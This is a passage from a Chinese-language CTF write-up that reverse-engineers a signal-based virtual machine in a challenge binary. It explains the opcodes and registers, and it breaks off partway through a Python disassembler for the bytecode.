&lt;span style=&#34;color:#75715e&#34;&gt;/* 0x00000100 used on sparc */&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;/* 0x00000200 used on sparc */&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;#define SA_UNSUPPORTED	0x00000400
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define SA_EXPOSE_TAGBITS	0x00000800
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;/* 0x00010000 used on mips */&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;/* 0x00800000 used for internal SA_IMMUTABLE */&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;/* 0x01000000 used on x86 */&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;/* 0x02000000 used on x86 */&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;/*
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; * New architectures should not define the obsolete
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *	SA_RESTORER	0x04000000
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; */&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;#ifndef SA_ONSTACK
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define SA_ONSTACK	0x08000000
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#endif
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#ifndef SA_RESTART
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define SA_RESTART	0x10000000
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#endif
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#ifndef SA_NODEFER
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define SA_NODEFER	0x40000000
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#endif
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#ifndef SA_RESETHAND
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define SA_RESETHAND	0x80000000
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#endif
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;题目中使用的是 &lt;code&gt;SA_SIGINFO&lt;/code&gt;，对信号处理程序提供了附加信息：一个指向 &lt;code&gt;siginfo&lt;/code&gt; 结构的指针以及一个指向上下文标识符的指针&lt;/p&gt;
&lt;p&gt;比如上述部分就是将 &lt;code&gt;sub_400E1D&lt;/code&gt; 函数注册为34信号的处理函数&lt;/p&gt;
&lt;p&gt;主程序中，为 &lt;code&gt;2&lt;/code&gt; 信号注册了一个处理函数，这个函数是用于对最终加密结果进行判断的，随后进行了一个初始化，接下来进入一个死循环，等待子程序发送 &lt;code&gt;2&lt;/code&gt; 信号&lt;/p&gt;
&lt;p&gt;接下来需要了解是如何读取指令的&lt;/p&gt;
&lt;p&gt;子程序中调用了函数 &lt;code&gt;sub_400A0D(dword_4019C0, s1);&lt;/code&gt;，其中，第一个参数是vm的指令码，s1是输入的 &lt;code&gt;flag&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;这个函数是由 &lt;code&gt;while&lt;/code&gt; 循环和 &lt;code&gt;switch&lt;/code&gt; 语句实现的&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c++&#34; data-lang=&#34;c++&#34;&gt;    v41 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; a1[(&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__int8&lt;/span&gt;)qword_6030C8[&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;]];
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( v41 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt; )
      &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;;
    &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;qword_6030C8[&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;];
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这里可以看出来 &lt;code&gt;a1&lt;/code&gt; 存储了vm程序的机器码，&lt;code&gt;qword_6030C8[20]&lt;/code&gt; 存放的是 &lt;code&gt;eip&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c++&#34; data-lang=&#34;c++&#34;&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;switch&lt;/span&gt; ( v41 )
    {
      &lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;
      &lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;
      &lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;
      &lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;
      &lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;
      &lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;
      &lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;
      &lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;
      &lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;
      &lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;
        v2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; qword_6030C8[&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;];
        qword_6030C8[&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v2 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
        &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;v42 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; a1[v2];
        &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;;
      &lt;span style=&#34;color:#66d9ef&#34;&gt;default&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;;
    }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这个 &lt;code&gt;switch&lt;/code&gt; 中判断指令码是否为 &lt;code&gt;0, 8, 9 ...&lt;/code&gt;，如果是，将会进行 &lt;code&gt;eip+1&lt;/code&gt; 的操作，并再从机器码中取出一位，说明这些指令含有参数&lt;/p&gt;
&lt;p&gt;接下来选择几个指令，分析是如何传参的&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c++&#34; data-lang=&#34;c++&#34;&gt;      &lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;
        v3 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; getppid();
        sigqueue(v3, &lt;span style=&#34;color:#ae81ff&#34;&gt;34&lt;/span&gt;, (&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;union&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;sigval&lt;/span&gt;)v42);
        &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;code&gt;0&lt;/code&gt; 指令发送了 &lt;code&gt;34&lt;/code&gt; 信号量，将参数设置为 &lt;code&gt;sigval&lt;/code&gt; 进行传递，这个指令仅传递了一个指令参数&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c++&#34; data-lang=&#34;c++&#34;&gt;      &lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;
        val &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; qword_6030C8 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;;
        v4 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; getppid();
        sigqueue(v4, &lt;span style=&#34;color:#ae81ff&#34;&gt;34&lt;/span&gt;, (&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;union&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;sigval&lt;/span&gt;)val);
        &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;;
      &lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;
        vala &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; qword_6030C8 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt;;
        v5 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; getppid();
        sigqueue(v5, &lt;span style=&#34;color:#ae81ff&#34;&gt;34&lt;/span&gt;, (&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;union&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;sigval&lt;/span&gt;)vala);
        &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;;
      &lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;
        valb &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; qword_6030C8 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;;
        v6 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; getppid();
        sigqueue(v6, &lt;span style=&#34;color:#ae81ff&#34;&gt;34&lt;/span&gt;, (&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;union&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;sigval&lt;/span&gt;)valb);
        &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;code&gt;1, 2, 3&lt;/code&gt; 三条指令区别仅在于使用的全局变量地址不同（可以猜测出来是三个不同的寄存器）&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c++&#34; data-lang=&#34;c++&#34;&gt;      &lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;
        valf &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; qword_6030C8 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;;
        v11 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; getppid();
        sigqueue(v11, &lt;span style=&#34;color:#ae81ff&#34;&gt;37&lt;/span&gt;, (&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;union&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;sigval&lt;/span&gt;)valf);
        &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;根据之前的分析，&lt;code&gt;8&lt;/code&gt; 指令理应含有参数，但只传递了寄存器一个参数，因此观察处理函数&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c++&#34; data-lang=&#34;c++&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__fastcall&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;sub_400F16&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; a1, siginfo_t &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;a2)
{
  &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_BYTE &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)a2&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;_sifields._timer.si_sigval.sival_ptr &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; s1[&lt;span style=&#34;color:#ae81ff&#34;&gt;79&lt;/span&gt;];
  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; semop(semid, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;stru_6030BE, &lt;span style=&#34;color:#ae81ff&#34;&gt;1uLL&lt;/span&gt;);
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;发现使用了 &lt;code&gt;s1[79]&lt;/code&gt; 这个变量，而 vm 函数中含有语句 &lt;code&gt;v42 = s1 + 79;&lt;/code&gt; 因此，参数通过 &lt;code&gt;s1[79]&lt;/code&gt; 这个全局变量传递到了处理函数中&lt;/p&gt;
&lt;p&gt;还有一类指令只有kill&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c++&#34; data-lang=&#34;c++&#34;&gt;      &lt;span style=&#34;color:#66d9ef&#34;&gt;case&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;
        v24 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; getppid();
        kill(v24, &lt;span style=&#34;color:#ae81ff&#34;&gt;46&lt;/span&gt;);
        &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这类指令仅传递了全局变量&lt;/p&gt;
&lt;p&gt;最后经过对每条指令的分析，以及动调查看内存，确定 &lt;code&gt;qword_6030C8[19]&lt;/code&gt; 是 &lt;code&gt;esp&lt;/code&gt;，&lt;code&gt;*(_QWORD *)qword_6030C8&lt;/code&gt; 模拟了栈，&lt;code&gt;*((_QWORD *)qword_6030C8 + 1)&lt;/code&gt; 是输入的开始地址，&lt;code&gt;qword_6030C8[16, 17, 18]&lt;/code&gt; 是三个寄存器，&lt;code&gt;qword_6030C8[21]&lt;/code&gt; 是跳转用的 &lt;code&gt;ZF&lt;/code&gt; 标志位&lt;/p&gt;
&lt;h2 id=&#34;writeup&#34;&gt;Writeup&lt;/h2&gt;
&lt;p&gt;先手动反汇编&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;code &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [
    &lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;52&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;42&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;36&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, 
    &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;72&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;, 
    &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;50&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;, 
    &lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;61&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;52&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;, 
    &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;85&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;
]

sub_400E1D &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;push(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;);&amp;#34;&lt;/span&gt;
sub_400E78 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;pop(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;);&amp;#34;&lt;/span&gt;
sub_400F16 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; += &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;;&amp;#34;&lt;/span&gt;
sub_400FA8 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; -= &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;;&amp;#34;&lt;/span&gt;

eip &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# 20&lt;/span&gt;
eax &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# 16&lt;/span&gt;
ebx &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# 17&lt;/span&gt;
ecx &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# 18&lt;/span&gt;
edx &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# 19&lt;/span&gt;
memory &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1000&lt;/span&gt;
memory2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;50&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; eip &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; len(code):
    cur_op &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; code[eip]
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; cur_op &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;:
